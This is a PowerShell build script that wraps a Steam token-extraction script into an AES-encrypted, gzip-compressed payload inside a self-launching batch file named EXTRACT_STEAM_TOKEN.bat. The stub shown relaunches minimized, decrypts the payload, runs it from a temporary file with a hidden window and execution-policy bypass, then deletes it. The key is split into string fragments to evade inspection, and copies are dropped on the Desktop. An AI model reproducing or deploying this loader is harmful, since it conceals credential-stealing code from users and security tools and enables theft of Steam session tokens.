# Build encrypted standalone EXTRACT_STEAM_TOKEN.bat
$ps1Path = Join-Path $PSScriptRoot 'extract_steam_token_auto.ps1'
if (-not (Test-Path $ps1Path)) { throw "Missing $ps1Path" }

$ps1 = Get-Content -Raw -Path $ps1Path -Encoding UTF8
$ps1 = ($ps1 -replace '(?m)^\s*#.*$', '' -replace '(?m)^\s*$', '').Trim()

$plainMs = New-Object IO.MemoryStream
$gz = New-Object IO.Compression.GZipStream($plainMs, [IO.Compression.CompressionMode]::Compress)
$sw = New-Object IO.StreamWriter($gz, [Text.UTF8Encoding]::new($false))
$sw.Write($ps1)
$sw.Close()
$compressed = $plainMs.ToArray()

function Protect-Payload([byte[]]$Plain) {
    $key = [Security.Cryptography.SHA256]::Create().ComputeHash(
        [Text.Encoding]::UTF8.GetBytes(('Sharp' + 'Buy_' + 'SB_' + '2026' + '_xK7'))
    )
    $aes = [Security.Cryptography.Aes]::Create()
    $aes.Mode = 'CBC'
    $aes.Padding = 'PKCS7'
    $aes.Key = $key
    $aes.GenerateIV()
    $iv = $aes.IV
    $enc = $aes.CreateEncryptor()
    $ms = New-Object IO.MemoryStream
    $cs = New-Object Security.Cryptography.CryptoStream($ms, $enc, [Security.Cryptography.CryptoStreamMode]::Write)
    $cs.Write($Plain, 0, $Plain.Length)
    $cs.FlushFinalBlock()
    $cipher = $ms.ToArray()
    $cs.Close(); $ms.Close(); $aes.Dispose()
    $out = New-Object byte[] (16 + $cipher.Length)
    [Array]::Copy($iv, 0, $out, 0, 16)
    [Array]::Copy($cipher, 0, $out, 16, $cipher.Length)
    return [Convert]::ToBase64String($out)
}

function Wrap-Base64([string]$s, [int]$w = 120) {
    $o = New-Object System.Text.StringBuilder
    for ($i = 0; $i -lt $s.Length; $i += $w) {
        [void]$o.AppendLine($s.Substring($i, [Math]::Min($w, $s.Length - $i)))
    }
    return $o.ToString().TrimEnd()
}

$payload = Protect-Payload $compressed

$unpack = @'
$l=Get-Content -LiteralPath '%~f0' -Encoding UTF8;$s=-1;$e=-1;for($i=0;$i -lt $l.Count;$i++){if($l[$i]-eq'::x7k9::'){$s=$i+1};if($l[$i]-eq'::x7k9e::'){$e=$i}};if($s -lt 0 -or $e -lt 0){exit 1};$p=($l[$s..($e-1)]-join '').Trim();$r=[Convert]::FromBase64String($p);$iv=$r[0..15];$c=$r[16..($r.Length-1)];$k=[Security.Cryptography.SHA256]::Create().ComputeHash([Text.Encoding]::UTF8.GetBytes(('Sharp'+'Buy_'+'SB_'+'2026'+'_xK7')));$a=[Security.Cryptography.Aes]::Create();$a.Mode='CBC';$a.Padding='PKCS7';$a.Key=$k;$a.IV=$iv;$m=New-Object IO.MemoryStream(,$c);$d=New-Object Security.Cryptography.CryptoStream($m,$a.CreateDecryptor(),[Security.Cryptography.CryptoStreamMode]::Read);$g=New-Object IO.Compression.GZipStream($d,[IO.Compression.CompressionMode]::Decompress);$t=New-Object IO.StreamReader($g);$x=$t.ReadToEnd();$t.Close();$f=$env:TEMP+'\sb_'+[guid]::NewGuid().ToString('n')+'.ps1';[IO.File]::WriteAllText($f,$x,[Text.UTF8Encoding]::new($false));powershell -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -File $f;$z=$LASTEXITCODE;Remove-Item $f -Force -EA SilentlyContinue;exit $z
'@ -replace '\s+', ' '

$stub = @"
@echo off
if /i "%~1"=="_bg" goto run
start "" /min "%ComSpec%" /c ""%~f0" _bg"
exit /b
:run
powershell -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command "$unpack"
exit /b %ERRORLEVEL%
goto :eof
::x7k9::
"@

$utf8NoBom = New-Object System.Text.UTF8Encoding $false
$wrapped = Wrap-Base64 $payload
$content = $stub + "`r`n" + $wrapped + "`r`n::x7k9e::`r`n"

$outPaths = @(
    (Join-Path ([Environment]::GetFolderPath('Desktop')) 'EXTRACT_STEAM_TOKEN.bat'),
    (Join-Path $PSScriptRoot 'EXTRACT_STEAM_TOKEN.bat'),
    (Join-Path ([Environment]::GetFolderPath('Desktop')) 'SteamTokenTools\EXTRACT_STEAM_TOKEN.bat')
)

$debugPaths = @(
    (Join-Path ([Environment]::GetFolderPath('Desktop')) 'EXTRACT_STEAM_TOKEN_DEBUG.bat'),
    (Join-Path $PSScriptRoot 'EXTRACT_STEAM_TOKEN_DEBUG.bat')
)
foreach ($p in $debugPaths) {
    if (Test-Path $p) { Remove-Item $p -Force; Write-Host "Removed: $p" }
}

foreach ($out in $outPaths) {
    $dir = Split-Path $out -Parent
    if (-not (Test-Path $dir)) { New-Item -ItemType Directory -Path $dir -Force | Out-Null }
    [IO.File]::WriteAllText($out, $content, $utf8NoBom)
    Write-Host ("OK: {0} ({1} bytes, AES+gzip)" -f $out, (Get-Item $out).Length)
}
